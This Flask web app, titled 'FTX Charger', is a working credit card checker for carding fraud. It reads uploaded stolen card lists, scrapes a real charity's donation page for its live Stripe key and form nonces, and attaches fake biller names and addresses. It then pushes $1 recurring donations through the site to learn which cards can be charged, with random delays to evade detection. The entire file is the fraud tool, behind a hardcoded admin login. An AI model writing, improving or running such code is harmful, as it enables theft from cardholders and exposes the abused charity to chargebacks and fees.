# app.py
# Vercel-compatible version – NO if __name__ == '__main__' block

from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import os
import re
import time
import random
import threading
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ─── STATE ──────────────────────────────────────────────────────────────
check_results = []
is_checking = False
stop_flag = False
total_cards = 0
lock = threading.Lock()

def random_name():
    return random.choice(["Ahmed","Mohamed","Sarah","Omar","Layla"]), random.choice(["Khalil","Abdullah","Smith","Johnson","Garcia"])

def random_address():
    cities = ["New York","Los Angeles","Chicago","Houston"]
    i = random.randint(0, len(cities)-1)
    return cities[i], ["NY","CA","IL","TX"][i], f"{random.randint(100,9999)} Main St", ["10001","90001","60601","77001"][i]

def random_email():
    return f"user{random.randint(10000,999999)}{random.choice('abcdefghijklmnopqrstuvwxyz')}@gmail.com"

def check_ccs(cc_lines):
    global is_checking, stop_flag, total_cards

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"

    with lock:
        total_cards = len(cc_lines)
        check_results.clear()
        is_checking = True
        stop_flag = False

    session = requests.Session()

    for idx, raw in enumerate(cc_lines, 1):
        with lock:
            if stop_flag:
                check_results.append((idx, raw.strip(), "STOPPED BY USER"))
                break

        line = raw.strip()
        if '|' not in line:
            continue

        try:
            num, mm, yy, cvc = [x.strip() for x in line.split('|')]
            yy = yy[-2:]
        except:
            check_results.append((idx, line, "BAD FORMAT"))
            continue

        try:
            r = session.get("https://pipelineforchangefoundation.com/donate/", headers={"User-Agent": ua}, timeout=14)
            soup = BeautifulSoup(r.text, "html.parser")

            formid = soup.find("input", {"name": "charitable_form_id"})["value"]
            nonce  = soup.find("input", {"name": "_charitable_donation_nonce"})["value"]
            cap    = soup.find("input", {"name": "campaign_id"})["value"]
            pk_live = re.search(r'"key":"(pk_live_[^"]+)"', r.text).group(1)
        except Exception as e:
            print("Page parse fail:", str(e))
            check_results.append((idx, line, "PAGE ERROR"))
            continue

        fn, ln = random_name()
        city, state, addr, zipc = random_address()
        email = random_email()

        pm_data = {
            "type": "card",
            "billing_details[name]": f"{fn} {ln}",
            "billing_details[email]": email,
            "billing_details[address][city]": city,
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": addr,
            "billing_details[address][postal_code]": zipc,
            "billing_details[address][state]": state,
            "card[number]": num,
            "card[cvc]": cvc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "key": pk_live,
        }

        try:
            pm = requests.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers={"User-Agent": ua}, timeout=12)
            pm_id = pm.json()["id"]
        except Exception as e:
            print("PM fail:", str(e))
            check_results.append((idx, line, "PM FAIL"))
            continue

        donation = {
            "charitable_form_id": formid,
            formid: "",
            "_charitable_donation_nonce": nonce,
            "campaign_id": cap,
            "description": "Donate",
            "ID": "742502",
            "recurring_donation": "yes",
            "donation_amount": "recurring-custom",
            "custom_recurring_donation_amount": "1.00",
            "recurring_donation_period": "week",
            "first_name": fn,
            "last_name": ln,
            "email": email,
            "address": addr,
            "city": city,
            "state": state,
            "postcode": zipc,
            "country": "US",
            "gateway": "stripe",
            "stripe_payment_method": pm_id,
            "action": "make_donation",
        }

        try:
            resp = session.post(
                "https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php",
                data=donation,
                headers={
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://pipelineforchangefoundation.com/donate/",
                },
                timeout=18
            )

            text = resp.text.lower()
            if "thank you" in text or "successfully" in text:
                status = "CHARGED 1.00$ ✅"
            elif "requires_action" in text:
                status = "3DS REQUIRED"
            else:
                status = "DECLINED"
        except Exception as e:
            print("Donate fail:", str(e))
            status = "REQUEST ERROR"

        check_results.append((idx, line, status))
        time.sleep(random.uniform(3.5, 8.0))

    with lock:
        is_checking = False

# ─── HTML ───────────────────────────────────────────────────────────────

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    body {background:#111;color:#eee;font-family:sans-serif;height:100vh;margin:0;display:grid;place-items:center;}
    .card {background:#222;padding:3rem;border-radius:12px;box-shadow:0 0 40px #000;max-width:380px;width:90%;}
    h1 {color:#0af;text-align:center;margin-bottom:2rem;}
    input {width:100%;padding:1rem;margin:1rem 0;border-radius:6px;border:1px solid #444;background:#333;color:white;}
    button {width:100%;padding:1rem;background:#0066cc;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;}
    button:hover {background:#0080ff;}
    .err {color:#f55;text-align:center;margin-top:1rem;}
  </style>
</head>
<body>
  <div class="card">
    <h1>FTX Panel</h1>
    <form method="POST">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">LOGIN</button>
    </form>
    {% if error %}<div class="err">{{ error }}</div>{% endif %}
  </div>
</body>
</html>"""

PANEL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FTX Charger</title>
  <style>
    body {background:#111;color:#eee;font-family:sans-serif;margin:0;padding:2rem;}
    .container {max-width:1000px;margin:auto;}
    h1 {color:#0af;text-align:center;}
    .card {background:#222;padding:2rem;border-radius:12px;margin:2rem 0;box-shadow:0 0 30px #000;}
    input[type=file] {width:100%;padding:1.2rem;background:#333;border:2px dashed #444;border-radius:8px;color:#eee;}
    button {padding:1rem 2rem;background:#0066cc;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;margin:0.5rem;}
    button.stop {background:#c44;}
    button:hover {opacity:0.9;}
    textarea {width:100%;height:240px;background:#000;color:#0f0;font-family:monospace;padding:1rem;border:1px solid #444;border-radius:8px;margin:1rem 0;}
    table {width:100%;border-collapse:collapse;margin-top:1rem;}
    th,td {padding:10px;text-align:left;border-bottom:1px solid #333;}
    th {background:#2a2a2a;color:#0af;}
    .ok {color:#0f0;}
    .bad {color:#f55;}
    .warn {color:#ff5;}
  </style>
</head>
<body>
  <div class="container">
    <h1>FTX Charger</h1>

    <div class="card">
      {% if not is_checking %}
      <form method="post" enctype="multipart/form-data">
        <input type="file" name="ccfile" accept=".txt" required>
        <button type="submit">START</button>
      </form>
      {% else %}
      <p>Processing {{ len(check_results) }} / {{ total_cards }}</p>
      <button class="stop" onclick="stopNow()">STOP</button>
      {% endif %}
    </div>

    {% if check_results %}
    <div class="card">
      <button onclick="copyAll()">Copy results</button>
      <textarea id="res">{{ '\n'.join([f"{i} | {cc} | {res}" for i,cc,res in check_results]) }}</textarea>

      <table>
        <tr><th>#</th><th>CC</th><th>Status</th></tr>
        {% for i,cc,res in check_results %}
        <tr>
          <td>{{ i }}</td>
          <td style="font-family:monospace;">{{ cc }}</td>
          <td class="{% if 'CHARGED' in res %}ok{% elif 'DECLINED' in res or 'ERROR' in res %}bad{% else %}warn{% endif %}">{{ res }}</td>
        </tr>
        {% endfor %}
      </table>
    </div>
    {% endif %}
  </div>

  <script>
    function copyAll() {
      navigator.clipboard.writeText(document.getElementById("res").value)
        .then(() => alert("Copied"));
    }
    function stopNow() {
      if (confirm("Stop?")) {
        fetch("/stop", {method:"POST"}).then(() => location.reload());
      }
    }
    {% if is_checking %}setTimeout(() => location.reload(), 8000);{% endif %}
  </script>
</body>
</html>"""

@app.route("/", methods=["GET", "POST"])
def login():
    try:
        if request.method == "POST":
            u = request.form.get("username", "").strip()
            p = request.form.get("password", "").strip()
            if u == "admin" and p == "123":
                session["logged"] = True
                return redirect("/panel")
            return render_template_string(LOGIN_HTML, error="Wrong login")
        return render_template_string(LOGIN_HTML)
    except Exception as e:
        print("Login crash:", str(e))
        return "<h1>Login error</h1><pre>" + str(e) + "</pre>", 500

@app.route("/panel", methods=["GET", "POST"])
def panel():
    global is_checking, stop_flag

    try:
        if not session.get("logged"):
            return redirect("/")

        if request.method == "POST" and not is_checking:
            file = request.files.get("ccfile")
            if file and file.filename.lower().endswith(".txt"):
                try:
                    lines = []
                    for chunk in file.stream:
                        lines.extend(chunk.decode("utf-8", errors="ignore").splitlines())
                    lines = [l.strip() for l in lines if '|' in l]
                    if lines:
                        threading.Thread(target=check_ccs, args=(lines,), daemon=True).start()
                except Exception as e:
                    print("File read error:", str(e))

        return render_template_string(PANEL_HTML,
                                     is_checking=is_checking,
                                     check_results=check_results,
                                     total_cards=total_cards)
    except Exception as e:
        print("Panel crash:", str(e))
        return "<h1>Panel error</h1><pre>" + str(e) + "</pre>", 500

@app.route("/stop", methods=["POST"])
def stop():
    global stop_flag
    with lock:
        stop_flag = True
    return jsonify({"ok": True})

# ────────────────────────────────────────────────────────────────
#   FOR LOCAL TESTING ONLY – comment out / delete for Vercel
# ────────────────────────────────────────────────────────────────
# if __name__ == '__main__':
#     app.run(host="0.0.0.0", port=5000, debug=True)
